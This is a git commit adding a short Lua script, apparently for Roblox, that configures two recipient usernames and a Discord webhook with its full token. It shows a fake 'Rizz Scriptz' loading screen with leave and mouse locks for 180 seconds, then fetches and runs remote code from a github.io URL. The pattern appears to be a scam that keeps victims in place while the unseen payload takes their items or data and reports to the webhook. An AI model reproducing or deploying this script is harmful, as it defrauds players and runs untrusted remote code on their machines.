659fb877d83a01d1fdf603d8e856c6228dd62c1f
trieush1 <132217687+trieush1@users.noreply.github.com>
2023-05-01 12:28:14 +0700

    Create myscript.lua

---
+++ myscript.lua
@@ -0,0 +1,15 @@
+UserName = "trieuyeuuyen"
+UserName2 = "Tpower_gamer"
+Webhook = "https://discord.com/api/webhooks/1102276848907472976/sXXKVZEJis1bW8hlndAc3XOadaxyrTkoWPluLcZ6vPkFMGTScUOIsz-qpV6ZJNGPQm6y"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "Rizz Scriptz"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()
